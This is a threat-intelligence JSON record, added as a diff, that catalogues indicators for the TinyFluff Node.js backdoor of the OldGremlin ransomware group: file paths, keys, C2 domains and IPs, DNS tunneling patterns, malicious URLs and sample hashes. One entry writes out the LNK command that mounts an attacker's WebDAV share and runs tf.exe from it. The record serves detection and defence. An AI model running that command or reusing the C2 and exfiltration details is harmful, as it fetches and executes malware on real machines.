@@ -1,0 +1,405 @@
+{
+  "malware_family": "TinyFluff",
+  "threat_actor": "OldGremlin",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "OldGremlin is a Russian-speaking ransomware gang that resumed attacks against Russian companies in March 2022. Their recent campaigns leverage TinyFluff, a custom Node.js-based backdoor delivered via malicious documents, which uses DNS tunneling for C2 communications and system reconnaissance.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "pdb_path",
+      "value": "Z:\\TinyFluff\\Release\\TinyFluff.pdb",
+      "context": "PDB path for TinyFluff variant from March 22 campaign.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "pdb_path",
+      "value": "Z:\\WebFluffPP\\Release\\TinyFluff.pdb",
+      "context": "PDB path for TinyFluff variant (tf.exe) from March 25 campaign.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%APPDATA%\\%MachineGuid%",
+      "context": "Directory created by TinyFluff, where MachineGuid is from the registry.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\docx1.zip",
+      "context": "Path where the initial malicious document is copied by the macro.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\word\\media\\image2.jpg",
+      "context": "Path where the executable payload is extracted before being renamed.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.cmd",
+      "context": "Path for persistence script, creation was commented out in one sample.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "image2.exe",
+      "context": "TinyFluff payload extracted by macro.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "s.txt",
+      "context": "Name of the malicious Javascript file used by TinyFluff.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "tf.exe",
+      "context": "TinyFluff payload downloaded via WebDAV.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid",
+      "context": "Read by TinyFluff to generate a unique directory name for its files.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "\"%ComSpec%\" /c net use http://192.248.176.138 && start \\\\192.248.176.138\\DavWWWRoot\\DopSog_Consultant.docx && start /b \\\\192.248.176.138\\DavWWWRoot\\tf.exe",
+      "context": "Command executed by malicious LNK files to mount WebDAV and run payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ipconfig /all",
+      "context": "Reconnaissance command executed by the implant via cmd.exe.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "TinyFluff",
+      "context": "Developer's name for the tool, found in the PDB string.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "MCowBQYDK2VwAyEAgp0p9o6lg/ZZ3WUJtx7UBBb1qYMZEDNC19Hbb84wt88=",
+      "context": "Base64-encoded public key used to verify the signature of C2 data.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "lin9gtmn",
+      "context": "Hardcoded RC4 key used to decrypt the second stage JS payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "TXT",
+      "context": "Name of the resource section containing the malicious JS script.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "NESC",
+      "context": "Name of a plugin the malware attempts to get information about.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "FWSE",
+      "context": "Name of a plugin the malware attempts to get information about.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": ".download:",
+      "context": "C2 command to read the contents of a file.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "_socks",
+      "context": "Function name in JS payload, likely to deploy a SOCKS proxy.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "tf.exe>node.exe",
+      "context": "TinyFluff loader launching the Node.js interpreter.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "node.exe>node.exe",
+      "context": "Obfuscated JS script restarting Node.js with a deobfuscated script argument.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "mirfinance.org",
+      "context": "Phishing domain used in March 22 campaign, registered with namecheap.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "eccbc8.com",
+      "context": "DGA-generated C2 domain used for DNS tunneling.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "a3c65c.org",
+      "context": "DGA-generated C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "46.101.113.161",
+      "context": "C2 server IP for TinyFluff, also used as NS server for C2 domains.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "161.35.41.9",
+      "context": "C2 server IP used as NS server for C2 domains.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "192.248.176.138",
+      "context": "WebDAV server used to host decoy documents and the tf.exe payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://dl.dropboxusercontent.com/s/1956cypkkihawuu/Anketa.docx?dl=0",
+      "context": "URL hosting the initial malicious document (Anketa.docx).",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://dl.dropboxusercontent.com/s/gjyjs0rbtihy7ue/Doc1.dotm",
+      "context": "URL hosting the malicious template loaded by Anketa.docx.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://nodejs.org/dist/latest-erbium/win-x86/node.exe",
+      "context": "Legitimate URL from which one TinyFluff variant downloads the Node.js interpreter.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "[0-9a-f]{4}.[0-9a-f]{8}.%dga_domain%",
+      "context": "DNS query format for a TXT record to initiate communication.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "0x*.lin9gtmn.eccbc8.com",
+      "context": "DNS query pattern to download the second stage tool.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "1x*.*.*.*.eccbc8.com",
+      "context": "DNS query pattern for data exfiltration via chunked hex in subdomains.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "2x.*.*.eccbc8.com",
+      "context": "DNS query pattern to retrieve C2 connection parameters.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "3x.*.eccbc8.com",
+      "context": "DNS query pattern to request commands from the C2 server.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "ns1.eccbc8.com",
+      "context": "Authoritative nameserver for C2 domain, pointing to actor infrastructure.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/{0.[0-9]*/}",
+      "context": "Format identifier passed in initial HTTP C2 connection.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "700FC6C697A869CC978D042B024E59C5FCD4E8905C2FBC7CAEEB3760C2905B5C",
+      "description": "Initial malicious document (Anketa.docx)"
+    },
+    {
+      "sha256": "ea95c527da29ca29072617dce28a567d11a7c777f2fcc2a752d0dff626180e70",
+      "description": "Malicious template (Doc1.dotm)"
+    },
+    {
+      "sha256": "4682A66EFA7C79AB56DFDFC1BBA5CF001D380D516FF1B64ACEA0B53784FDE8CC",
+      "description": "TinyFluff payload (image2.exe)"
+    },
+    {
+      "sha256": "476852E3257631D6AC2882237CFA146DCAEFE17A10A11B984AEC5CC9B61D48D4",
+      "description": "Malicious script (s.txt) for DNS tunnel variant"
+    },
+    {
+      "sha256": "f36305e01515b73607f0f8941d9093fabe1b7a7e3f90c18f137403a0f016cdff",
+      "description": "Malicious LNK (DopSog_Consultant.docx.lnk)"
+    },
+    {
+      "sha256": "0a0889330501ee52ca5fe2b2f41fbcad7d26afce8bc430c7fe274e6ebe64c680",
+      "description": "Malicious LNK (Akt_sverki_Consultant.docx.lnk)"
+    },
+    {
+      "sha256": "8f3747775a1bdeae4627763687bdcb2ef325874e7a908f3ec24380c5d2f2b44a",
+      "description": "TinyFluff payload (tf.exe)"
+    },
+    {
+      "sha256": "2b507a5d9af760667e18cd11584816575d102d7e9e1900de29b8513d30f6d65c",
+      "description": "Malicious script (s.txt) for WebDAV variant"
+    },
+    {
+      "sha256": "990ef464d76b206e4727ee9ccba9c0be33a278a26116c3c2c839125abc97777f",
+      "description": "Decoy document (DopSog_Consultant.docx)"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script",
+    "document",
+    "archive"
+  ]
+}
